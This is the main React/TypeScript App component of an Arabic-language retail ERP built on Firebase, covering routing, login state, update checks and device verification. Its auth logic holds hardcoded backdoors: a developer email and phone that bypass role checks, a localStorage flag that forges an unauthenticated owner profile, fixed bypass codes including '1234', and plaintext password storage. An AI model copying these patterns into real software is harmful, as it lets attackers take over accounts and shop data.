import { useState, useEffect, lazy, Suspense, useRef } from 'react';
import { Routes, Route, Navigate, Outlet, useLocation } from 'react-router-dom';
import { onAuthStateChanged, signInWithEmailAndPassword, createUserWithEmailAndPassword, signInAnonymously, updatePassword, User, signOut } from 'firebase/auth';
import { doc, getDoc, setDoc, deleteDoc, updateDoc, serverTimestamp, Timestamp, query, collection, where, getDocs, onSnapshot, writeBatch } from 'firebase/firestore';
import { auth, db, handleFirestoreError, OperationType, ensureAuth, messaging, handleUnifiedPhoneLoginInBackground } from './firebase';
import { onMessage } from 'firebase/messaging';
import { UserProfile } from './types';
import Layout from './components/Layout';
import UniversalMediaPlayer from './components/UniversalMediaPlayer';

// Lazy load components for low memory footprint, code splitting and fast startup
const Dashboard = lazy(() => import('./Dashboard'));
const Maintenance = lazy(() => import('./components/Maintenance'));
const Inventory = lazy(() => import('./components/Inventory'));
const Sales = lazy(() => import('./components/Sales'));
const Customers = lazy(() => import('./components/Customers'));
const InventoryMatching = lazy(() => import('./components/InventoryMatching'));
const Archive = lazy(() => import('./components/Archive'));
const Users = lazy(() => import('./components/Users'));
const MobileBalance = lazy(() => import('./components/MobileBalance'));
const SIMManagement = lazy(() => import('./components/SIMManagement'));
const Suppliers = lazy(() => import('./components/Suppliers'));
const Attendance = lazy(() => import('./components/Attendance'));
const ActivityLogs = lazy(() => import('./components/ActivityLogs'));

const HelpCenter = lazy(() => import('./components/HelpCenter'));
const OrdersAndShortages = lazy(() => import('./components/OrdersAndShortages'));
const SmartAccountingHub = lazy(() => import('./components/SmartAccountingHub'));
const Settings = lazy(() => import('./components/Settings'));
const ReelsManager = lazy(() => import('./components/ReelsManager'));
const SuperAdmin = lazy(() => import('./components/SuperAdmin'));
const DistributorDashboard = lazy(() => import('./components/DistributorDashboard'));
const SmartImport = lazy(() => import('./components/SmartImport'));
const OperationsAndCustomers = lazy(() => import('./components/OperationsAndCustomers'));
const CustomerPortal = lazy(() => import('./components/CustomerPortal'));
const StoreClientLogin = lazy(() => import('./components/StoreClientLogin'));
const WholesalePOS = lazy(() => import('./components/WholesalePOS'));
const ChatHub = lazy(() => import('./components/ChatHub'));
const MarketUI = lazy(() => import('./components/MarketUI'));
const DamagedItems = lazy(() => import('./components/DamagedItems'));
const InvoiceScanner = lazy(() => import('./components/InvoiceScanner'));
const GeminiMonitoring = lazy(() => import('./components/GeminiMonitoring'));
const DeliveryAgentPortal = lazy(() => import('./components/DeliveryAgentPortal'));
const CashierDashboard = lazy(() => import('./components/CashierDashboard'));
const WorkforceWorkspace = lazy(() => import('./components/WorkforceWorkspace'));
const WarehousePrep = lazy(() => import('./components/WarehousePrep'));
const BankTransferManager = lazy(() => import('./components/BankTransferManager'));
import { logActivity } from './services/activityLogService';
import RegistrationModal from './components/RegistrationModal';
import Login from './components/Login';
import AppVersionEnforcerModal from './components/AppVersionEnforcerModal';
import YemenMidnightReconciliationOverlay from './components/YemenMidnightReconciliationOverlay';
import { NetworkGuardToast } from './components/NetworkGuardToast';
import QuotaOperationsMonitor from './components/QuotaOperationsMonitor';
import MiniPendingOperationsWidget from './components/MiniPendingOperationsWidget';
import { quotaAndOfflineEngine } from './services/quotaAndOfflineEngine';
import { initializeAppSecurityGuard } from './services/appSecurityGuard';
import { liveHotFixEngine } from './services/LiveHotFixEngine';
import { Joyride, Step } from 'react-joyride';
import { securityService, getBrowserHWID, isMobileDevice, validateSystemTime, validateDeveloperOverrideCode, updateLastActive, startAntiDebugger, getCloudServerTime, checkTrialEligibility, generateTrialCode, validateTrialCode, isOfflineLimitExceeded, recordOnlineStatus, getRemainingOfflineHours, getSafeCachedLicense } from './services/securityService';
import { remoteAccessService } from './services/remoteAccessService';
import { isRemoteMode } from './services/securityService';
import { useConnectivity } from './hooks/useConnectivity';
import { FirebaseProjectRouter } from './services/FirebaseProjectRouter';
import { validateUserVariantAccess, getCurrentVariant, APP_VARIANTS } from './services/variantEngine';
import { antiTamperLicenseVault } from './services/AntiTamperLicenseVault';

const CURRENT_VERSION = "4.0.1";
const CURRENT_VERSION_APK = "4.0.1";
const CURRENT_VERSION_EXE = "4.0.1";
const CURRENT_VERSION_WEB = "4.0.1";

// Smart Multi-Layered Platform & Build Sensing
const getPlatformType = (): 'apk' | 'exe' | 'web' => {
  if (typeof window === 'undefined') return 'web';
  
  // 1. Check for Electron (EXE)
  const isElectron = !!(
    (window as any).electron || 
    (window as any).ElectronBridge || 
    navigator.userAgent.toLowerCase().includes('electron') ||
    typeof (window as any).require === 'function' ||
    (window as any).process?.versions?.electron
  );
  if (isElectron) return 'exe';

  // 2. Check for Capacitor (APK)
  const isCapacitor = !!(
    (window as any).Capacitor?.isNativePlatform?.() || 
    navigator.userAgent.toLowerCase().includes('android') && (window as any).Capacitor
  );
  if (isCapacitor) return 'apk';

  // Fallback check
  if (
    window.location.origin.includes('capacitor://') ||
    (window as any).AndroidBridge || 
    (window as any).Capacitor
  ) {
    return 'apk';
  }

  return 'web';
};
import { SYSTEM_LOGO } from './constants/assets';
import JAMLogoSVG from './components/JAMLogoSVG';
import { Wifi, WifiOff, Globe, Zap, Database, Smartphone, Share2, Wrench, RotateCcw, ShieldCheck, HardDrive, KeyRound, Loader2, LogIn, AlertTriangle, ShieldAlert, User as UserIcon, Lock, ShieldX, Clock, Gift, UserPlus, Info, ShoppingBasket } from 'lucide-react';
import { motion, AnimatePresence } from 'motion/react';
import { VaultProvider } from './context/VaultContext';
import { SystemSyncProvider } from './context/SystemSyncContext';
import { LoadingProvider } from './context/LoadingContext';
import { ShoppingCartProvider } from './context/ShoppingCartContext';

import { OfflineAuthService, TimeProtectionService, getDomainForRole, checkRealInternetConnectivity, trackFailedLoginAttempt, resetFailedLoginAttempts } from './services/OfflineCore';
import { DevicePermissionsService } from './services/DevicePermissionsService';

import { adService, Ad } from './services/adService';
import AdOverlay from './components/AdOverlay';

// Admin Guard to prevent customers from entering staff areas
function AdminGuard({ profile }: { profile: UserProfile | null }) {
  const location = useLocation();
  
  // If profile is not loaded yet but we are authenticated or loading, wait instead of redirecting to portal
  if (!profile) {
    return (
      <div className="min-h-screen bg-[#001122] flex items-center justify-center p-6 text-center select-none font-sans">
        <div className="flex items-center gap-3 bg-gradient-to-r from-emerald-500/20 to-cyan-500/20 border-2 border-emerald-500/30 rounded-full px-6 py-3">
          <Loader2 className="w-5 h-5 text-emerald-400 animate-spin" />
          <span className="text-xs font-black text-emerald-300">جاري التحقق من الصلاحيات الإدارية...</span>
        </div>
      </div>
    );
  }

  const isDeveloper = profile.email?.toLowerCase() === 'a777503191@gmail.com' || profile.phone === '777503191';
  const isCustomerRole = !isDeveloper && (
                         profile.role === 'customer' || 
                         profile.role === 'RETAIL_CUSTOMER' || 
                         profile.role === 'Customer/Client' || 
                         profile.role === 'Client' || 
                         profile.role?.toLowerCase() === 'customer' || 
                         profile.role?.toLowerCase() === 'client' || 
                         profile.role === 'guest' || 
                         profile.role === 'Guest');
  if (isCustomerRole) {
    const search = location.search;
    return <Navigate to={`/portal${search}`} replace />;
  }
  return <Outlet />;
}

function isBypassSecurity(p: any) {
  if (!p) return false;
  const role = p.role || '';
  const email = (p.email || '').toLowerCase();
  return ['owner', 'manager', 'superadmin'].includes(role) || 
         email === 'a777503191@gmail.com';
}

export default function App() {
  const [user, setUser] = useState<User | null>(() => {
    const isExplicitLogin = typeof window !== 'undefined' && (
      window.location.hash.includes('login') ||
      sessionStorage.getItem('just_logged_out') === 'true' ||
      localStorage.getItem('jam_user_logged_out') === 'true'
    );
    if (isExplicitLogin) {
      return null;
    }
    if (localStorage.getItem('jam_guest_recovery_force_owner') === 'true') {
      return { uid: 'system' } as any;
    }
    try {
      const cached = sessionStorage.getItem('jam_fast_auth_profile') ||
                     sessionStorage.getItem('jam_cached_user_profile') ||
                     localStorage.getItem('jam_fast_auth_profile') ||
                     localStorage.getItem('jam_cached_user_profile');
      if (cached) {
        const parsed = JSON.parse(cached);
        if (parsed && parsed.uid) {
          return { uid: parsed.uid, email: parsed.email } as any;
        }
      }
    } catch (e) {}
    return null;
  });
  const [profile, setProfile] = useState<UserProfile | null>(() => {
    const isExplicitLogin = typeof window !== 'undefined' && (
      window.location.hash.includes('login') ||
      sessionStorage.getItem('just_logged_out') === 'true' ||
      localStorage.getItem('jam_user_logged_out') === 'true'
    );
    if (isExplicitLogin) {
      return null;
    }
    if (localStorage.getItem('jam_guest_recovery_force_owner') === 'true') {
      return {
        uid: 'system',
        role: 'owner',
        name: 'المالك المطور',
        email: 'system@jam-pro.net',
        phone: '777503191',
        status: 'active',
        shopName: 'Jam system pro',
        isLifetime: true,
        subscriptionType: 'lifetime',
        isSecurityCodeSet: true,
        securityCode: '7727'
      } as any;
    }
    try {
      const cached = sessionStorage.getItem('jam_fast_auth_profile') ||
                     sessionStorage.getItem('jam_cached_user_profile') ||
                     localStorage.getItem('jam_fast_auth_profile') ||
                     localStorage.getItem('jam_cached_user_profile');
      if (cached) {
        return JSON.parse(cached);
      }
    } catch (e) {
      console.warn('Failed to parse cached profile:', e);
    }
    return null;
  });
  const [loading, setLoading] = useState(() => {
    const isExplicitLogin = typeof window !== 'undefined' && (
      window.location.hash.includes('login') ||
      sessionStorage.getItem('just_logged_out') === 'true' ||
      localStorage.getItem('jam_user_logged_out') === 'true'
    );
    if (isExplicitLogin) {
      return false;
    }
    if (localStorage.getItem('jam_guest_recovery_force_owner') === 'true') {
      return false;
    }
    // Instant 0ms boot if cached session exists in sessionStorage or localStorage
    if (sessionStorage.getItem('jam_fast_auth_profile') ||
        sessionStorage.getItem('jam_cached_user_profile') ||
        localStorage.getItem('jam_fast_auth_profile') ||
        localStorage.getItem('jam_cached_user_profile')) {
      return false;
    }
    return true;
  });

  // Listener for direct navigation to login route
  useEffect(() => {
    const handleLoginRouteCheck = () => {
      if (window.location.hash.includes('login')) {
        FirebaseProjectRouter.clearUserSessionFast();
        setUser(null);
        setProfile(null);
        setLoading(false);
      }
    };
    handleLoginRouteCheck();
    window.addEventListener('hashchange', handleLoginRouteCheck);
    return () => window.removeEventListener('hashchange', handleLoginRouteCheck);
  }, []);

  useEffect(() => {
    // Smart auto-completion of loading screen on mobile APK builds to prevent hanging on "opening control panel and syncing"
    const platform = getPlatformType();
    if (platform === 'apk' && loading) {
      const timer = setTimeout(() => {
        console.warn('⚠️ Force-completing the smart loading sync screen on APK to ensure fluid boot.');
        setLoading(false);
      }, 3500);
      return () => clearTimeout(timer);
    }
  }, [loading]);
  const [shopName, setShopName] = useState(() => {
    return localStorage.getItem('jam_last_logged_in_shop_name') || 'Jam system pro';
  });
  useEffect(() => {
    if (profile) {
      // Robustly preserve the logged-in profile so it loads immediately on next boot (0ms fast track)
      FirebaseProjectRouter.cacheUserSessionFast(profile);

      const isCustomer = profile.role === 'customer' || 
                         profile.role === 'RETAIL_CUSTOMER' || 
                         profile.role === 'Customer/Client' || 
                         profile.role === 'Client' || 
                         profile.role?.toLowerCase() === 'customer' || 
                         profile.role?.toLowerCase() === 'client';
      const type = isCustomer ? 'customer' : 'shop';
      localStorage.setItem('jam_last_logged_in_shop_type', type);
      
      const fetchShopBranding = async () => {
        let nameToSave = profile.shopName || '';
        
        // If it's a customer and doesn't have a direct shopName, let's fetch the parent settings or owner user doc
        if (!nameToSave && profile.ownerId) {
          try {
            const settingsSnap = await getDoc(doc(db, 'settings', profile.ownerId));
            if (settingsSnap.exists()) {
              nameToSave = settingsSnap.data().shopName || '';
            }
            if (!nameToSave) {
              const ownerSnap = await getDoc(doc(db, 'users', profile.ownerId));
              if (ownerSnap.exists()) {
                nameToSave = ownerSnap.data().shopName || '';
              }
            }
          } catch (e: any) {
            const errMsg = e instanceof Error ? e.message : String(e);
            if (errMsg.toLowerCase().includes('offline') || errMsg.toLowerCase().includes('unavailable') || !navigator.onLine) {
              console.warn('Graceful Fallback: Operating offline, cannot resolve customer shop name from server right now:', errMsg);
            } else {
              console.warn('Could not resolve shop name for customer:', errMsg);
            }
          }
        }
        
        if (nameToSave) {
          setShopName(nameToSave);
          localStorage.setItem('jam_last_logged_in_shop_name', nameToSave);
        }
      };
      
      fetchShopBranding();
    }
  }, [profile]);
  const [licenseExpiry, setLicenseExpiry] = useState<Timestamp | null>(null);
  const [username, setUsername] = useState(localStorage.getItem('jam_remembered_username') || '');
  const [password, setPassword] = useState(localStorage.getItem('jam_remembered_password') || '');
  const [rememberMe, setRememberMe] = useState(localStorage.getItem('jam_remember_me') === 'true');
  const [offlineRemainingDays, setOfflineRemainingDays] = useState<number>(() => {
    return OfflineAuthService.getOfflineRemainingDays();
  });
  const [loginError, setLoginError] = useState('');
  const [isLoggingIn, setIsLoggingIn] = useState(false);
  const [securityError, setSecurityError] = useState<{ 
    type: 'hwid' | 'time' | 'suspended' | 'expired' | 'pending' | 'trial_ended' | 'lockout' | 'offline_limit' | 'exe_license' | 'apk_license' | 'apk_role' | 'apk_hwid'; 
    message: string; 
    hwid?: string; 
    limit?: number; 
    registeredCount?: number; 
  } | null>(null);
  const [isRegistrationModalOpen, setIsRegistrationModalOpen] = useState(false);
  const [isTrialLoading, setIsTrialLoading] = useState(false);
  const [isRemoteProcessing, setIsRemoteProcessing] = useState(isRemoteMode());
  const [activeAds, setActiveAds] = useState<Ad[]>([]);
  const [isAdOpen, setIsAdOpen] = useState(false);
  const [isLoggingOut, setIsLoggingOut] = useState(false);
  const [timeConsistent, setTimeConsistent] = useState(true);
  const [securityCamouflageActive, setSecurityCamouflageActive] = useState(false);

  const [updateGuard, setUpdateGuard] = useState<{
    latestVersion: string;
    isMandatory: boolean;
    showOptionalBanner: boolean;
    updateUrl?: string;
    whatsNew?: string;
  } | null>(null);

  const [dismissOptionalUpdate, setDismissOptionalUpdate] = useState(false);

  // --- Task: Web Lockout state ---
  const [isWebLocked, setIsWebLocked] = useState(false);
  const [isWebLockBypassed, setIsWebLockBypassed] = useState(() => {
    return localStorage.getItem('jam_web_lock_bypassed') === 'true';
  });
  const [desktopDownloadUrl, setDesktopDownloadUrl] = useState("https://jam-pro.net/downloads/jam-pro-desktop.exe");
  const [mobileDownloadUrl, setMobileDownloadUrl] = useState("https://jam-pro.net/downloads/jam-pro-mobile.apk");
  const [webLockBypassCode, setWebLockBypassCode] = useState("");
  const [webLockBypassError, setWebLockBypassError] = useState("");

  useEffect(() => {
    initializeAppSecurityGuard(getPlatformType());
    liveHotFixEngine.initialize();
    const controller = new AbortController();
    const { signal } = controller;

    // Zero-delay offline check: Fallback instantly to pulling local security / parameters
    if (!navigator.onLine) {
      console.warn("🌐 Client is offline. Instantly aborting network sync of app config & pulling cache parameters.");
      controller.abort();
      const safeLicense = getSafeCachedLicense();
      setUpdateGuard(null);
      return;
    }

    const docRef = doc(db, 'settings', 'app_config');
    
    // Fallback sync timeout to prevent deadlocks / waiting forever
    const syncTimeout = setTimeout(() => {
      console.warn("⏱️ Connection stalled during firebase sync. Instantly aborting connection and using local cache.");
      controller.abort();
      const safeLicense = getSafeCachedLicense();
    }, 4000);

    let unsubscribe = () => {};
    try {
      unsubscribe = onSnapshot(docRef, (snapshot) => {
        clearTimeout(syncTimeout);
        if (signal.aborted) return;
        if (snapshot.exists()) {
          const data = snapshot.data();
          const platform = getPlatformType();
          
          setIsWebLocked(!!data.forceWebLock);
          if (data.desktopDownloadUrl) setDesktopDownloadUrl(data.desktopDownloadUrl);
          if (data.mobileDownloadUrl) setMobileDownloadUrl(data.mobileDownloadUrl);
          
          let targetLatestVersion = data.latestVersion || "2.5.0";
          let targetIsMandatory = !!data.isMandatory;
          let targetUpdateUrl = data.updateUrl || "";
          let targetWhatsNew = data.whatsNew || "";
          let currentAppVersion = CURRENT_VERSION_WEB;

          if (platform === 'apk') {
            targetLatestVersion = data.latestVersion_apk || data.latestVersion || "2.5.0";
            targetIsMandatory = !!data.isMandatory_apk;
            targetUpdateUrl = data.updateUrl_apk || data.updateUrl || "";
            targetWhatsNew = data.whatsNew_apk || data.whatsNew || "";
            currentAppVersion = CURRENT_VERSION_APK;
          } else if (platform === 'exe') {
            targetLatestVersion = data.latestVersion_exe || data.latestVersion || "2.5.0";
            targetIsMandatory = !!data.isMandatory_exe;
            targetUpdateUrl = data.updateUrl_exe || data.updateUrl || "";
            targetWhatsNew = data.whatsNew_exe || data.whatsNew || "";
            currentAppVersion = CURRENT_VERSION_EXE;
          } else {
            targetLatestVersion = data.latestVersion_web || data.latestVersion || "2.5.0";
            targetIsMandatory = !!data.isMandatory_web || !!data.isMandatory;
            targetUpdateUrl = data.updateUrl_web || data.updateUrl || "";
            targetWhatsNew = data.whatsNew_web || data.whatsNew || "";
            currentAppVersion = CURRENT_VERSION_WEB;
          }
          
          if (targetLatestVersion !== currentAppVersion) {
            const isAlreadyDismissed = typeof window !== 'undefined' && (
              localStorage.getItem('jam_dismissed_update_version') === targetLatestVersion ||
              localStorage.getItem('jam_installed_update_version') === targetLatestVersion ||
              localStorage.getItem('jam_last_applied_patch_id') === `v_${targetLatestVersion.replace(/\./g, '_')}`
            );

            if (!isAlreadyDismissed) {
              // Background OTA update preparation: DO NOT BLOCK USER OR HALT WORK!
              liveHotFixEngine.scheduleIdleUpdatePrompt({
                patchId: `v_${targetLatestVersion.replace(/\./g, '_')}`,
                version: targetLatestVersion,
                timestamp: new Date().toISOString(),
                title: `تحديث برمجي فوري v${targetLatestVersion}`,
                description: targetWhatsNew || 'تحديث تلقائي تم تنزيله في الخلفية دون مقاطعة لعملك وبحفظ كامل لبياناتك.',
                isMandatory: false,
                active: true,
                forceReload: true
              });

              setUpdateGuard({
                latestVersion: targetLatestVersion,
                isMandatory: false,
                showOptionalBanner: true,
                updateUrl: targetUpdateUrl,
                whatsNew: targetWhatsNew,
              });
            } else {
              setUpdateGuard(null);
            }
          } else {
            setUpdateGuard(null);
          }
        }
      }, (err) => {
        console.warn("Notice reading app config (using offline/local settings): ", err?.message || err);
        clearTimeout(syncTimeout);
        controller.abort();
        const safeLicense = getSafeCachedLicense();
      });
    } catch (e) {
      clearTimeout(syncTimeout);
      controller.abort();
      const safeLicense = getSafeCachedLicense();
    }

    return () => {
      clearTimeout(syncTimeout);
      unsubscribe();
      controller.abort();
    };
  }, []);

  // Key combination to trigger Lockdown Camouflage Mode (Ctrl + Shift + Z)
  useEffect(() => {
    const handleLockdownShortcut = (e: KeyboardEvent) => {
      if (e.ctrlKey && e.shiftKey && e.key.toLowerCase() === 'z') {
        e.preventDefault();
        setSecurityCamouflageActive(true);
        localStorage.setItem('JAM_SYSTEM_SECURITY_CAMOUFLAGE', 'true');
      }
    };
    window.addEventListener('keydown', handleLockdownShortcut);
    return () => window.removeEventListener('keydown', handleLockdownShortcut);
  }, []);

  // Check Time Consistency on boot and request Android/Web permissions automatically
  useEffect(() => {
    if (!TimeProtectionService.isTimeConsistent()) {
      setTimeConsistent(false);
    }
    // Launch device permission requester for Camera, Audio, Notifications, Location
    DevicePermissionsService.requestAllRequiredPermissions();
  }, []);

  // FCM Foreground Listener & Call Overlays
  const [incomingCall, setIncomingCall] = useState<{ callerName: string; roomId: string } | null>(null);
  const audioContextRef = useRef<AudioContext | null>(null);
  const ringIntervalRef = useRef<any>(null);
  const profileUnsubRef = useRef<(() => void) | null>(null);

  useEffect(() => {
    // Listen to background messages posting down to currently active window client
    const handleSWMessage = (event: MessageEvent) => {
      if (event.data && event.data.type === 'INCOMING_CALL') {
        setIncomingCall({
          callerName: event.data.callerName,
          roomId: event.data.roomId
        });
      }
    };
    window.addEventListener('message', handleSWMessage);

    if (messaging) {
      const unsubscribe = onMessage(messaging, (payload) => {
        console.log('Message received in foreground: ', payload);
        
        let callerName = '';
        let roomId = '';
        
        if (payload.data && (payload.data.type === 'INCOMING_CALL' || payload.data.type === 'call_signal' || payload.data.action === 'call')) {
          callerName = payload.data.callerName || 'عميل أو مورد جديد';
          roomId = payload.data.roomId || 'auto_room';
          setIncomingCall({ callerName, roomId });
          return;
        }

        if (payload.notification) {
          // [MUTED & SILENCED FOR FOCUS BLOCK]
          console.log('Foreground notification muted:', payload.notification);
        }
      });
      return () => {
        window.removeEventListener('message', handleSWMessage);
        unsubscribe();
      };
    }
    return () => {
      window.removeEventListener('message', handleSWMessage);
    };
  }, []);

  // Ringtone behavior when incoming call is open
  useEffect(() => {
    if (incomingCall) {
      const playRingtone = () => {
        try {
          const AudioContextClass = window.AudioContext || (window as any).webkitAudioContext;
          if (!AudioContextClass) return;
          
          const ctx = new AudioContextClass();
          audioContextRef.current = ctx;

          const playBeep = () => {
            if (!audioContextRef.current || audioContextRef.current.state === 'closed') return;
            
            const now = audioContextRef.current.currentTime;
            
            // First ring
            const osc1 = audioContextRef.current.createOscillator();
            const osc2 = audioContextRef.current.createOscillator();
            const gain = audioContextRef.current.createGain();

            osc1.type = 'sine';
            osc1.frequency.setValueAtTime(440, now);
            osc2.type = 'sine';
            osc2.frequency.setValueAtTime(480, now);

            gain.gain.setValueAtTime(0, now);
            gain.gain.linearRampToValueAtTime(0.15, now + 0.1);
            gain.gain.setValueAtTime(0.15, now + 0.6);
            gain.gain.exponentialRampToValueAtTime(0.001, now + 0.8);

            osc1.connect(gain);
            osc2.connect(gain);
            gain.connect(audioContextRef.current.destination);

            osc1.start(now);
            osc2.start(now);
            osc1.stop(now + 0.8);
            osc2.stop(now + 0.8);

            // Second ring
            const osc1_2 = audioContextRef.current.createOscillator();
            const osc2_2 = audioContextRef.current.createOscillator();
            const gain_2 = audioContextRef.current.createGain();

            osc1_2.type = 'sine';
            osc1_2.frequency.setValueAtTime(440, now + 1.0);
            osc2_2.type = 'sine';
            osc2_2.frequency.setValueAtTime(480, now + 1.0);

            gain_2.gain.setValueAtTime(0, now + 1.0);
            gain_2.gain.linearRampToValueAtTime(0.15, now + 1.1);
            gain_2.gain.setValueAtTime(0.15, now + 1.6);
            gain_2.gain.exponentialRampToValueAtTime(0.001, now + 1.8);

            osc1_2.connect(gain_2);
            osc2_2.connect(gain_2);
            gain_2.connect(audioContextRef.current.destination);

            osc1_2.start(now + 1.0);
            osc2_2.start(now + 1.0);
            osc1_2.stop(now + 1.8);
            osc2_2.stop(now + 1.8);
          };

          playBeep();
          ringIntervalRef.current = setInterval(playBeep, 4000);
        } catch (e) {
          console.warn('Ringtone play failed:', e);
        }
      };
      playRingtone();
    } else {
      if (ringIntervalRef.current) {
        clearInterval(ringIntervalRef.current);
        ringIntervalRef.current = null;
      }
      if (audioContextRef.current) {
        audioContextRef.current.close().catch(() => {});
        audioContextRef.current = null;
      }
    }
    return () => {
      if (ringIntervalRef.current) {
        clearInterval(ringIntervalRef.current);
      }
      if (audioContextRef.current) {
        audioContextRef.current.close().catch(() => {});
      }
    };
  }, [incomingCall]);

  // Initialize Security Service and Ads
  useEffect(() => {
    if (typeof window !== 'undefined') {
      (window as any).__user_profile = profile;
    }
  }, [profile]);

  useEffect(() => {
    const initApp = async () => {
      try {
        await securityService.initialize();
      } catch (e) {
        console.error("🔒 App: Failed to initialize securityService safely:", e);
      }
      
      // Default theme handling
      document.documentElement.classList.add('dark');
    };
    initApp();
  }, [profile?.role, profile?.visualTheme]);

  // The Isolation Law Route Guard for RETAIL_CUSTOMER or customer role
  useEffect(() => {
    const handleGuard = () => {
      const isDevUser = profile?.email?.toLowerCase() === 'a777503191@gmail.com' || profile?.phone === '777503191';
      if (profile && !isDevUser && (profile.role === 'customer' || profile.role === 'RETAIL_CUSTOMER')) {
        const hash = window.location.hash || '#/portal';
        if (!hash.includes('/portal') && !hash.includes('/cp')) {
          console.warn('The Isolation Law prevents access to internal ERP paths for retail customers.');
          const currentParams = hash.split('?')[1];
          const search = currentParams ? `?${currentParams}` : '';
          window.location.hash = `#/portal${search}`;
        }
      }
    };
    handleGuard();
    window.addEventListener('hashchange', handleGuard);
    return () => window.removeEventListener('hashchange', handleGuard);
  }, [profile]);

  // Handle Initial Theme Setting (Before profile load)
  useEffect(() => {
    // Default to Dark mode on boot for consistent branding until profile loads
    document.documentElement.classList.add('dark');
  }, []);

  // Fetch Ads for first entry
  useEffect(() => {
    if (user && profile && !isPortalMode()) {
      const fetchAds = async () => {
        const seg = profile.role === 'superadmin' ? 'superadmin' : profile.role === 'manager' ? 'retailer' : 'retailer';
        
        // 1. First Entry Ads
        const firstEntryAds = await adService.getRelevantAds(seg, 'first_entry');
        
        // 2. Scheduled Ads (Current or past due but active)
        const scheduledAds = await adService.getRelevantAds(seg, 'scheduled');
        
        const allAds = [...firstEntryAds, ...scheduledAds];
        if (allAds.length > 0) {
          setActiveAds(allAds);
          setIsAdOpen(true);
        }
      };
      
      // Delay slightly for better UX
      const timer = setTimeout(fetchAds, 3000);
      return () => clearTimeout(timer);
    }
  }, [user, profile]);

  const handleLogout = async () => {
    performLogout();
  };

  const performLogout = async () => {
    try {
      (window as any).isLoggingOut = true;
      sessionStorage.setItem('just_logged_out', 'true');
      localStorage.setItem('jam_user_logged_out', 'true');
      setIsLoggingOut(true);
      // Instantly clear client-side states for immediate UI transition
      setUser(null);
      setProfile(null);
      setLoading(false);
      
      FirebaseProjectRouter.clearUserSessionFast();
      
      // Remove recovery force flags
      localStorage.removeItem('jam_guest_recovery_force_owner');
      
      // Explicitly sign out of Firebase
      try {
        await signOut(auth);
      } catch (authErr) {
        console.warn('Firebase signOut failed (tolerated on session cleanup):', authErr);
      }
      
      // Extensive cleanup for security lockdown
      localStorage.removeItem('customerPhone');
      localStorage.removeItem('customerName');
      localStorage.removeItem('user_token');
      localStorage.removeItem('user_role');
      localStorage.removeItem('current_shop_id');
      localStorage.removeItem('jam_session_verified');
      localStorage.removeItem('jam_remembered_username');
      localStorage.removeItem('jam_remembered_password');
      localStorage.removeItem('jam_remember_me');
      localStorage.removeItem('jam_cached_user_profile');
      localStorage.removeItem('jam_fast_auth_profile');
      
      sessionStorage.clear();
      // Restore flags to prevent any background re-auth cycle after session.clear()
      sessionStorage.setItem('just_logged_out', 'true');
      localStorage.setItem('jam_user_logged_out', 'true');
      
      // STRICT REDIRECT to main login, clearing all URL state
      window.location.href = window.location.origin + window.location.pathname + '#/login';
      window.location.reload();
    } catch (e) {
      console.error('Logout error:', e);
      // Fallback
      window.location.href = window.location.origin + window.location.pathname + '#/login';
      window.location.reload();
    } finally {
      setIsLoggingOut(false);
    }
  };

  const isPortalMode = () => {
    const hasPortalHash = window.location.hash.includes('/portal') || window.location.hash.includes('/cp');
    const hasShopParam = new URLSearchParams(window.location.search).has('shop') || 
                         window.location.hash.includes('shop=');
    return hasPortalHash || hasShopParam;
  };
  const [isMaintenanceMode, setIsMaintenanceMode] = useState(false);
  const [runTour, setRunTour] = useState(false);
  const [offlineError, setOfflineError] = useState(false);
  const [isSyncingOffline, setIsSyncingOffline] = useState(false);
  const [syncOfflineMsg, setSyncOfflineMsg] = useState('');
  const [isSessionVerified, setIsSessionVerified] = useState(
    sessionStorage.getItem('jam_session_verified') === 'true' ||
    localStorage.getItem('jam_session_verified') === 'true' ||
    localStorage.getItem('jam_device_trusted') === 'true' ||
    localStorage.getItem('jam_persistent_device_verified') === 'true' ||
    localStorage.getItem('jam_guest_recovery_force_owner') === 'true'
  );

  const checkAndBypassSecurity = (profileData: any) => {
    if (!profileData) return false;

    // شرط التخطي المطلق: إذا كان الحساب هو المالك (manager أو owner) أو المشرف العام (superadmin)
    const isOwnerOrAdmin = profileData.role === 'manager' || profileData.role === 'superadmin' || profileData.role === 'owner';
    
    if (isOwnerOrAdmin) {
      // تفعيل التخطي الصامت وحفظ موثوقية الجهاز للأبد لمنع ظهور الشاشة مستقبلاً
      if (!isSessionVerified) {
        setIsSessionVerified(true);
        localStorage.setItem('jam_persistent_device_verified', 'true');
      }
      return true; // نعم، تخطي الحماية فوراً
    }

    // الموظفين العاديين يمرون بالفحص الطبيعي لحماية بيانات المحل
    return isSessionVerified;
  };
  const [verificationInput, setVerificationInput] = useState('');
  const [setupCode, setSetupCode] = useState('');
  const [confirmSetupCode, setConfirmSetupCode] = useState('');
  const [showEmergencyInput, setShowEmergencyInput] = useState(false);
  const [showDeveloperContactNotice, setShowDeveloperContactNotice] = useState(false);
  const [emergencyInput, setEmergencyInput] = useState('');
  const [overrideVal, setOverrideVal] = useState('');
  const [overrideError, setOverrideError] = useState('');
  const [isSubmittingOverride, setIsSubmittingOverride] = useState(false);

  const [isSubmittingSecurity, setIsSubmittingSecurity] = useState(false);

  const handleVerifyCode = async () => {
    if (!profile || !user?.uid || isSubmittingSecurity) return;
    const requiredCode = profile.securityCode || '1234';
    
    const isOwner = profile.email?.toLowerCase() === 'a777503191@gmail.com';
    const isOwnerBypass = isOwner && (verificationInput === '77270997' || verificationInput === '7727' || verificationInput === '1234');

    if (verificationInput !== requiredCode && !isOwnerBypass) {
      alert('الرمز الأمني المدخل غير صحيح!');
      return;
    }
    setIsSubmittingSecurity(true);
    try {
      const hwid = getBrowserHWID();
      const trusted = profile.trustedDevices || [];
      const updates: any = {};
      
      if (!trusted.includes(hwid) && !['superadmin', 'customer'].includes(profile.role)) {
        updates.trustedDevices = [...trusted, hwid];
      }
      
      if (isOwnerBypass) {
        updates.securityCode = '7727';
        updates.isSecurityCodeSet = true;
        updates.mustChangeSecurityCode = false;
      }
      
      if (Object.keys(updates).length > 0) {
        await updateDoc(doc(db, 'users', user.uid), {
          ...updates,
          updatedAt: serverTimestamp()
        });
      }

      setIsSessionVerified(true);
      sessionStorage.setItem('jam_session_verified', 'true');
      setVerificationInput('');
      
      if (isOwnerBypass) {
        alert('تم التحقق والدخول بنجاح! تم تعيين رمز أمان جديد ومبسط لك تلقائياً وهو: 7727 ليتوافق مع خانات الحماية الجديدة.');
      }
    } catch (e) {
      console.error('Device registration failed:', e);
      setIsSessionVerified(true);
    } finally {
      setIsSubmittingSecurity(false);
    }
  };

